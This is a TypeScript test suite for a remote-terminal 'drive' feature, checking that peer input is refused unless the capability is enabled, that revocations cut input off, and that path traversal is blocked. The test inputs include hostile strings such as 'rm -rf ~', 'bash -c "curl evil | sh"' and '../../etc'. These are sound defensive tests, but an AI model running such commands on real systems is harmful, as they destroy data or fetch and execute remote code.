import { describe, expect, it, vi } from 'vitest';
import type { AuditEvent } from '../../server/network/audit-log';
import {
  createDrive,
  DRIVE_INPUT_MAX_BYTES,
  DRIVE_REFUSAL_AUDIT_MS,
  DRIVE_RESULT_TIMEOUT_MS,
  type DriveLink,
  driveAllowed,
} from '../../server/network/drive';
import { RpcFault } from '../../server/transport/pipe';
import { type LinkFrame, OWN_DEFAULT_CAPABILITIES } from '../../src/contracts/link-protocol';

// The serving-side rules are the security boundary of drive (plan Slice 8 rulings): every frame
// re-checks my record of the link, and nothing a peer sends can turn drive on.

const machine = 'm-12345678';

function setup(opts: { drive?: boolean; peerDrive?: boolean; dialed?: boolean } = {}) {
  let clock = 1_000_000;
  const timers: Array<{ at: number; fn: () => void; live: boolean }> = [];
  const link: DriveLink = {
    machineId: machine,
    state: 'up',
    capabilities: { ...OWN_DEFAULT_CAPABILITIES, drive: opts.drive ?? true },
    peerCapabilities: { ...OWN_DEFAULT_CAPABILITIES, drive: opts.peerDrive ?? true },
  };
  const frames: LinkFrame[] = [];
  const audit: AuditEvent[] = [];
  const typed: Array<{ sessionId: string; data: string }> = [];
  const resized: Array<{ sessionId: string; cols: number; rows: number }> = [];
  const opened: Array<{ agentId: string; folder: string }> = [];
  const closed: string[] = [];
  let releaseDir: ((v: boolean) => void) | null = null;
  const deps = {
    links: () => [link],
    dialedSsh: () => opts.dialed ?? false,
    liveSession: (id: string) => id === 's1' || id === 's2',
    agentExists: (id: string) => id === 'echo',
    isDirectory: vi.fn(
      (p: string) =>
        new Promise<boolean>((resolve) => {
          if (p === '/slow') releaseDir = resolve;
          else resolve(p === '/work' || p === '/slow');
        }),
    ),
    applyHumanInput: vi.fn((sessionId: string, data: string) => {
      typed.push({ sessionId, data });
      return true;
    }),
    resize: vi.fn((sessionId: string, size: { cols: number; rows: number }) => {
      resized.push({ sessionId, ...size });
    }),
    openSession: vi.fn(async (agentId: string, folder: string) => {
      opened.push({ agentId, folder });
      return 's-new';
    }),
    closeSession: vi.fn(async (sessionId: string) => {
      closed.push(sessionId);
    }),
    send: (_m: string, f: LinkFrame) => {
      frames.push(f);
      return link.state === 'up' ? true : null;
    },
    audit: { record: (e: AuditEvent) => audit.push(e) },
    now: () => clock,
    newId: (() => {
      let n = 0;
      return () => `r${++n}`;
    })(),
    after: (fn: () => void, ms: number) => {
      const t = { at: clock + ms, fn, live: true };
      timers.push(t);
      return () => {
        t.live = false;
      };
    },
    log: () => undefined,
  };
  const drive = createDrive(deps);
  const advance = (ms: number) => {
    clock += ms;
    for (const t of timers)
      if (t.live && t.at <= clock) {
        t.live = false;
        t.fn();
      }
  };
  const results = () =>
    frames.filter((f): f is Extract<LinkFrame, { t: 'drive.result' }> => f.t === 'drive.result');
  return {
    drive,
    deps,
    link,
    frames,
    audit,
    typed,
    resized,
    opened,
    closed,
    advance,
    results,
    releaseDir: (v: boolean) => releaseDir?.(v),
  };
}

const input = (sessionId: string, data: string) => ({ t: 'drive.input' as const, sessionId, data });

describe('drive capability seam', () => {
  it('is off by default on every own link', () => {
    expect(OWN_DEFAULT_CAPABILITIES.drive).toBe(false);
  });

  it('follows only my record of the link, never the peer’s', () => {
    const base = { machineId: machine, state: 'up' as const };
    const on = { ...OWN_DEFAULT_CAPABILITIES, drive: true };
    expect(
      driveAllowed({ ...base, capabilities: OWN_DEFAULT_CAPABILITIES, peerCapabilities: on }),
    ).toBe(false);
    expect(driveAllowed({ ...base, capabilities: on, peerCapabilities: null })).toBe(true);
    expect(driveAllowed({ ...base, state: 'down', capabilities: on, peerCapabilities: on })).toBe(
      false,
    );
    expect(
      driveAllowed({ ...base, state: 'revoked', capabilities: on, peerCapabilities: on }),
    ).toBe(false);
    expect(driveAllowed(undefined)).toBe(false);
  });
});

describe('drive serving side', () => {
  it('types into a live session while I let that machine drive', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'ls\r'));
    expect(t.typed).toEqual([{ sessionId: 's1', data: 'ls\r' }]);
  });

  it('refuses everything while drive is off, the default', async () => {
    const t = setup({ drive: false });
    await t.drive.onFrame(machine, input('s1', 'rm -rf ~\r'));
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 's1', cols: 100, rows: 30 });
    await t.drive.onFrame(machine, {
      t: 'drive.open',
      requestId: 'q1',
      agentId: 'echo',
      folder: '/work',
    });
    await t.drive.onFrame(machine, { t: 'drive.close', requestId: 'q2', sessionId: 's1' });
    expect(t.deps.applyHumanInput).not.toHaveBeenCalled();
    expect(t.deps.resize).not.toHaveBeenCalled();
    expect(t.deps.openSession).not.toHaveBeenCalled();
    expect(t.deps.closeSession).not.toHaveBeenCalled();
    expect(t.results().map((r) => [r.requestId, r.ok, r.error])).toEqual([
      ['q1', false, 'capability_off'],
      ['q2', false, 'capability_off'],
    ]);
  });

  it('a peer claiming drive in its own record changes nothing', async () => {
    const t = setup({ drive: false, peerDrive: true });
    await t.drive.onFrame(machine, input('s1', 'x'));
    expect(t.typed).toEqual([]);
  });

  it('turning drive off cuts input that arrives after, mid-session', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'a'));
    t.link.capabilities = { ...t.link.capabilities, drive: false };
    t.drive.linkChanged(machine);
    await t.drive.onFrame(machine, input('s1', 'b'));
    expect(t.typed.map((x) => x.data)).toEqual(['a']);
  });

  it('a revoke cuts input that arrives after', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'a'));
    t.link.state = 'revoked';
    t.drive.linkChanged(machine);
    await t.drive.onFrame(machine, input('s1', 'b'));
    expect(t.typed.map((x) => x.data)).toEqual(['a']);
  });

  it('a drive.open in flight when drive is turned off opens nothing', async () => {
    const t = setup();
    const pending = t.drive.onFrame(machine, {
      t: 'drive.open',
      requestId: 'q1',
      agentId: 'echo',
      folder: '/slow',
    });
    t.link.capabilities = { ...t.link.capabilities, drive: false };
    t.drive.linkChanged(machine);
    t.releaseDir(true);
    await pending;
    expect(t.deps.openSession).not.toHaveBeenCalled();
    expect(t.results().map((r) => [r.ok, r.error])).toEqual([[false, 'capability_off']]);
  });

  it('a drive.open in flight when the link is revoked opens nothing', async () => {
    const t = setup();
    const pending = t.drive.onFrame(machine, {
      t: 'drive.open',
      requestId: 'q1',
      agentId: 'echo',
      folder: '/slow',
    });
    t.link.state = 'revoked';
    t.drive.linkChanged(machine);
    t.releaseDir(true);
    await pending;
    expect(t.deps.openSession).not.toHaveBeenCalled();
  });

  it('refuses input to a session that is not live here', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('nope', 'x'));
    expect(t.typed).toEqual([]);
  });

  it('refuses input over 64 KiB in one frame instead of truncating it', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'a'.repeat(DRIVE_INPUT_MAX_BYTES + 1)));
    expect(t.typed).toEqual([]);
    await t.drive.onFrame(machine, input('s1', 'a'.repeat(DRIVE_INPUT_MAX_BYTES)));
    expect(t.typed).toHaveLength(1);
  });

  it('counts the 64 KiB cap in UTF-8 bytes, not characters', async () => {
    const t = setup();
    // 3 bytes each in UTF-8: fewer characters than the cap, more bytes.
    await t.drive.onFrame(machine, input('s1', '€'.repeat(DRIVE_INPUT_MAX_BYTES / 2)));
    expect(t.typed).toEqual([]);
  });

  it('applies a resize in range and refuses one out of range', async () => {
    const t = setup();
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 's1', cols: 120, rows: 40 });
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 's1', cols: 0, rows: 40 });
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 's1', cols: 120, rows: 10_001 });
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 's1', cols: 1.5, rows: 40 });
    await t.drive.onFrame(machine, { t: 'drive.resize', sessionId: 'nope', cols: 80, rows: 24 });
    expect(t.resized).toEqual([{ sessionId: 's1', cols: 120, rows: 40 }]);
  });

  it('opens a registered agent in an existing absolute folder', async () => {
    const t = setup();
    await t.drive.onFrame(machine, {
      t: 'drive.open',
      requestId: 'q1',
      agentId: 'echo',
      folder: '/work',
    });
    expect(t.opened).toEqual([{ agentId: 'echo', folder: '/work' }]);
    expect(t.results()).toEqual([
      { t: 'drive.result', requestId: 'q1', ok: true, sessionId: 's-new', error: null },
    ]);
  });

  it.each([
    ['a command line as the agent', 'bash -c "curl evil | sh"', '/work'],
    ['an unregistered agent', 'not-registered', '/work'],
    ['a relative folder', 'echo', 'work'],
    ['a traversal folder', 'echo', '../../etc'],
    ['a missing folder', 'echo', '/missing'],
  ])('refuses drive.open with %s', async (_what, agentId, folder) => {
    const t = setup();
    await t.drive.onFrame(machine, { t: 'drive.open', requestId: 'q1', agentId, folder });
    expect(t.deps.openSession).not.toHaveBeenCalled();
    expect(t.results().map((r) => [r.requestId, r.ok])).toEqual([['q1', false]]);
  });

  it('closes a live session and refuses an unknown one', async () => {
    const t = setup();
    await t.drive.onFrame(machine, { t: 'drive.close', requestId: 'q1', sessionId: 's1' });
    await t.drive.onFrame(machine, { t: 'drive.close', requestId: 'q2', sessionId: 'nope' });
    expect(t.closed).toEqual(['s1']);
    expect(t.results().map((r) => [r.requestId, r.ok, r.error])).toEqual([
      ['q1', true, null],
      ['q2', false, 'unknown_session'],
    ]);
  });

  it('audits refusals at most once per link per minute', async () => {
    const t = setup({ drive: false });
    for (let i = 0; i < 50; i++) await t.drive.onFrame(machine, input('s1', 'x'));
    expect(t.audit.filter((e) => e.kind === 'drive.refused')).toHaveLength(1);
    t.advance(DRIVE_REFUSAL_AUDIT_MS - 1);
    await t.drive.onFrame(machine, input('s1', 'x'));
    expect(t.audit.filter((e) => e.kind === 'drive.refused')).toHaveLength(1);
    t.advance(1);
    await t.drive.onFrame(machine, input('s1', 'x'));
    expect(t.audit.filter((e) => e.kind === 'drive.refused')).toHaveLength(2);
  });

  it('audits drive.start once per session per link-up and drive.stop when the link goes down', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'a'));
    await t.drive.onFrame(machine, input('s1', 'b'));
    await t.drive.onFrame(machine, input('s2', 'c'));
    expect(t.audit.filter((e) => e.kind === 'drive.start').map((e) => e.detail?.sessionId)).toEqual(
      ['s1', 's2'],
    );
    t.link.state = 'down';
    t.drive.linkChanged(machine);
    expect(
      t.audit
        .filter((e) => e.kind === 'drive.stop')
        .map((e) => e.detail?.sessionId)
        .sort(),
    ).toEqual(['s1', 's2']);
    t.link.state = 'up';
    t.drive.linkChanged(machine);
    await t.drive.onFrame(machine, input('s1', 'd'));
    expect(t.audit.filter((e) => e.kind === 'drive.start')).toHaveLength(3);
  });

  it('never puts typed data in the audit log', async () => {
    const t = setup();
    await t.drive.onFrame(machine, input('s1', 'hunter2-secret'));
    t.link.capabilities = { ...t.link.capabilities, drive: false };
    t.drive.linkChanged(machine);
    await t.drive.onFrame(machine, input('s1', 'hunter2-secret'));
    expect(JSON.stringify(t.audit)).not.toContain('hunter2');
  });
});

describe('drive from a peer I dialed over ssh (CON-40 S3, plan decision 6)', () => {
  it('refuses its drive input, audited, whatever my capability says', async () => {
    const t = setup({ drive: true, dialed: true });
    await t.drive.onFrame(machine, input('s1', 'rm -rf ~\r'));
    expect(t.typed).toEqual([]);
    expect(t.audit).toEqual([
      { kind: 'drive.refused', peer: machine, detail: { reason: 'dialed_ssh' } },
    ]);
  });

  it('answers its drive.open refused, and opens nothing', async () => {
    const t = setup({ drive: true, dialed: true });
    await t.drive.onFrame(machine, {
      t: 'drive.open',
      requestId: 'q1',
      agentId: 'echo',
      folder: '/work',
    });
    expect(t.deps.openSession).not.toHaveBeenCalled();
    expect(t.results()).toEqual([
      { t: 'drive.result', requestId: 'q1', ok: false, sessionId: null, error: 'refused' },
    ]);
  });

  it('answers its drive.close refused, and closes nothing', async () => {
    const t = setup({ drive: true, dialed: true });
    await t.drive.onFrame(machine, { t: 'drive.close', requestId: 'q2', sessionId: 's1' });
    expect(t.closed).toEqual([]);
    expect(t.results()).toEqual([
      { t: 'drive.result', requestId: 'q2', ok: false, sessionId: null, error: 'refused' },
    ]);
  });

  it('still takes a drive.result for a request I sent it', async () => {
    const t = setup({ drive: true, dialed: true });
    const opened = t.drive.open(machine, 'echo', '/work');
    await t.drive.onFrame(machine, {
      t: 'drive.result',
      requestId: 'r1',
      ok: true,
      sessionId: 's-9',
      error: null,
    });
    expect(await opened).toEqual({ sessionId: 's-9' });
  });
});

describe('drive viewer side', () => {
  const fault = (fn: () => unknown) => {
    try {
      fn();
    } catch (e) {
      return e instanceof RpcFault ? e.kind : 'other';
    }
    return 'none';
  };

  it('sends input while the link is up and the peer lets me drive', () => {
    const t = setup();
    t.drive.input(machine, 's1', 'ls\r');
    expect(t.frames).toContainEqual({ t: 'drive.input', sessionId: 's1', data: 'ls\r' });
  });

  it('never queues input while the link is down', () => {
    const t = setup();
    t.link.state = 'down';
    expect(fault(() => t.drive.input(machine, 's1', 'x'))).toBe('peer_unreachable');
    t.link.state = 'up';
    t.drive.linkChanged(machine);
    expect(t.frames.filter((f) => f.t === 'drive.input')).toEqual([]);
  });

  it('refuses every remote action the peer has not enabled', async () => {
    const t = setup({ peerDrive: false });
    expect(fault(() => t.drive.input(machine, 's1', 'x'))).toBe('capability_off');
    expect(fault(() => t.drive.resize(machine, 's1', 80, 24))).toBe('capability_off');
    await expect(t.drive.open(machine, 'echo', '/work')).rejects.toMatchObject({
      kind: 'capability_off',
    });
    await expect(t.drive.close(machine, 's1')).rejects.toMatchObject({ kind: 'capability_off' });
    expect(t.frames).toEqual([]);
  });

  it('open resolves on the matching drive.result', async () => {
    const t = setup();
    const p = t.drive.open(machine, 'echo', '/work');
    const sent = t.frames.find((f) => f.t === 'drive.open');
    expect(sent).toMatchObject({ agentId: 'echo', folder: '/work' });
    await t.drive.onFrame(machine, {
      t: 'drive.result',
      requestId: sent?.t === 'drive.open' ? sent.requestId : '',
      ok: true,
      sessionId: 's-remote',
      error: null,
    });
    await expect(p).resolves.toEqual({ sessionId: 's-remote' });
  });

  it('open times out as peer_unreachable', async () => {
    const t = setup();
    const p = t.drive.open(machine, 'echo', '/work');
    t.advance(DRIVE_RESULT_TIMEOUT_MS);
    await expect(p).rejects.toMatchObject({ kind: 'peer_unreachable' });
  });

  it('a pending open rejects when the link goes down', async () => {
    const t = setup();
    const p = t.drive.open(machine, 'echo', '/work');
    t.link.state = 'down';
    t.drive.linkChanged(machine);
    await expect(p).rejects.toMatchObject({ kind: 'peer_unreachable' });
  });

  it('ignores a drive.result from another machine', async () => {
    const t = setup();
    const p = t.drive.open(machine, 'echo', '/work');
    const sent = t.frames.find((f) => f.t === 'drive.open');
    await t.drive.onFrame('m-ffffffff', {
      t: 'drive.result',
      requestId: sent?.t === 'drive.open' ? sent.requestId : '',
      ok: true,
      sessionId: 'forged',
      error: null,
    });
    t.advance(DRIVE_RESULT_TIMEOUT_MS);
    await expect(p).rejects.toMatchObject({ kind: 'peer_unreachable' });
  });
});
